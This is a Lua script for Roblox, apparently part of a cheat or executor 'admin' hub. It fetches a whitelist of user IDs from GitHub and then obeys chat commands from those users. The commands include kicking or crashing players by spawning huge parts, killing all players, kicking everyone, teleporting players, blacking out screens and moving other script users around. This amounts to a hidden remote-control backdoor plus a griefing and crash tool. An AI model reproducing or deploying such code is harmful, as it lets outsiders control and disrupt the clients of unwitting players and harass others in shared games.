local successWhitelist, whitelistData = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/Bruhiscrazy/Obsidian-/refs/heads/main/Whitelist")
end)

if successWhitelist and whitelistData then
    local successDecode, decodedTable = pcall(function() return httpService:JSONDecode(whitelistData) end)
    if successDecode and typeof(decodedTable) == "table" then
        local adminWhitelist = decodedTable
        local auraAdmins = {}
        local blindAdmins = {}
        local safetyBubbles = {}
        local adminStatus = {}
        
        local function isWhitelisted(player)
            return table.find(adminWhitelist, player.UserId) ~= nil
        end
        
        local function sendChatMessage(msg)
            if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local textChannels = textChatService:FindFirstChild("TextChannels")
                if textChannels then
                    local rbxGeneral = textChannels:FindFirstChild("RBXGeneral")
                    if rbxGeneral then
                        rbxGeneral:SendAsync(msg)
                    end
                end
            else
                local chatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
                    chatEvents.SayMessageRequest:FireServer(msg, "All")
                end
            end
        end
        
        local function kickOrCrashPlayer(player)
            if pcall(function() player:Kick("You were kicked by an admin!") end) then
                orionLib:MakeNotification({ Name = "💀 Kicked", Content = player.Name .. " has been kicked!", Time = 4 })
            else
                for i = 1, 50 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(9000000000, 9000000000, 9000000000)
                    part.Parent = workspace
                    debris:AddItem(part, 0.01)
                end
            end
        end
        
        local function findPlayerByName(name)
            local lowerName = name:lower()
            for _, player in ipairs(players:GetPlayers()) do
                if player.Name:lower():find(lowerName) or player.DisplayName:lower():find(lowerName) then
                    return player
                end
            end
            return nil
        end

        local function toggleBlindEffect(player)
            blindAdmins[player] = not blindAdmins[player]
            local blindGui = localPlayer.PlayerGui:FindFirstChild("BlindEffect")
            if blindAdmins[player] then
                if not blindGui then
                    local screenGui = Instance.new("ScreenGui")
                    screenGui.Name = "BlindEffect"
                    screenGui.ResetOnSpawn = false
                    local frame = Instance.new("Frame")
                    frame.Size = UDim2.new(1, 0, 1, 0)
                    frame.BackgroundColor3 = Color3.new(0, 0, 0)
                    frame.Parent = screenGui
                    screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
                end
            elseif blindGui then
                blindGui:Destroy()
            end
        end
        
        local function processAdminCommand(sender, message)
            if not isWhitelisted(sender) then return end
            if message:sub(1, 1) ~= ":" then return end
            local args = string.split(message:sub(2), " ")
            local command = args[1]:lower()
            table.remove(args, 1)
            local mergedArgs = table.concat(args, " ")
            
            if command == "say" then
                if mergedArgs ~= "" then sendChatMessage(mergedArgs) end
            elseif command == "kick" and mergedArgs ~= "" then
                local target = findPlayerByName(mergedArgs)
                if target then kickOrCrashPlayer(target) else sendChatMessage("Player not found") end
            elseif command == "killall" or command == "kill" then
                for _, player in ipairs(players:GetPlayers()) do
                    if player ~= sender and player.Character and player.Character:FindFirstChild("Humanoid") then
                        player.Character.Humanoid.Health = 0
                    end
                end
            elseif command == "banall" then
                for _, player in ipairs(players:GetPlayers()) do
                    if player ~= sender then player:Kick("Banned by admin") end
                end
            elseif command == "aura" then
                auraAdmins[sender] = not auraAdmins[sender]
            elseif command == "e" then
                toggleBlindEffect(sender)
            elseif command == "sb" then
                local radius = tonumber(mergedArgs)
                if radius and radius > 0 then
                    safetyBubbles[sender] = radius
                    sendChatMessage("Safety bubble set to " .. radius)
                else
                    safetyBubbles[sender] = nil
                    sendChatMessage("Safety bubble disabled")
                end
            elseif command == "1" and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
                local senderRoot = sender.Character.HumanoidRootPart
                for _, player in ipairs(players:GetPlayers()) do
                    if player ~= sender and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = senderRoot.CFrame + Vector3.new(3, 0, 0)
                    end
                end
            elseif command == "reveal" then
                sendChatMessage("best ftap player is bruh")
            end
        end

        local function setupChatCommands()
            if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local textChannels = textChatService:FindFirstChild("TextChannels")
                if textChannels then
                    local rbxGeneral = textChannels:FindFirstChild("RBXGeneral")
                    if rbxGeneral then
                        rbxGeneral.MessageReceived:Connect(function(msg)
                            local textSource = msg.TextSource
                            if textSource then
                                local player = players:GetPlayerByUserId(textSource.UserId)
                                if player then processAdminCommand(player, msg.Text) end
                            end
                        end)
                    end
                end
            else
                for _, player in ipairs(players:GetPlayers()) do
                    player.Chatted:Connect(function(msg) processAdminCommand(player, msg) end)
                end
                players.PlayerAdded:Connect(function(player)
                    player.Chatted:Connect(function(msg) processAdminCommand(player, msg) end)
                end)
            end
        end
        setupChatCommands()
        
        runService.Heartbeat:Connect(function()
            for admin, isAuraOn in pairs(auraAdmins) do
                if isAuraOn and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
                    local adminRoot = admin.Character.HumanoidRootPart
                    local currentTick = tick()
                    for statusAdmin, _ in pairs(adminStatus) do
                        if statusAdmin ~= admin and statusAdmin.Character and statusAdmin.Character:FindFirstChild("HumanoidRootPart") then
                            local offsetValue = (currentTick + statusAdmin.UserId) % (2 * math.pi)
                            local offsetX = math.cos(offsetValue)
                            local offsetZ = math.sin(offsetValue)
                            local offsetVec = Vector3.new(offsetX * 10, 0, offsetZ * 10)
                            statusAdmin.Character.HumanoidRootPart.CFrame = adminRoot.CFrame + offsetVec
                        end
                    end
                end
            end
        end)
        
        runService.Heartbeat:Connect(function()
            for admin, bubbleRadius in pairs(safetyBubbles) do
                if admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
                    local adminRoot = admin.Character.HumanoidRootPart
                    for statusAdmin, _ in pairs(adminStatus) do
                        if statusAdmin ~= admin and statusAdmin.Character and statusAdmin.Character:FindFirstChild("HumanoidRootPart") then
                            local statusRoot = statusAdmin.Character.HumanoidRootPart
                            if (adminRoot.Position - statusRoot.Position).Magnitude < bubbleRadius then
                                statusRoot.CFrame = CFrame.new(adminRoot.Position + (statusRoot.Position - adminRoot.Position).Unit * bubbleRadius)
                            end
                        end
                    end
                end
            end
        end)
        
        adminStatus[localPlayer] = true
        _G.OrionLib:Init()
        return
    end
    localPlayer:Kick("Whitelist data invalid")
    return
end

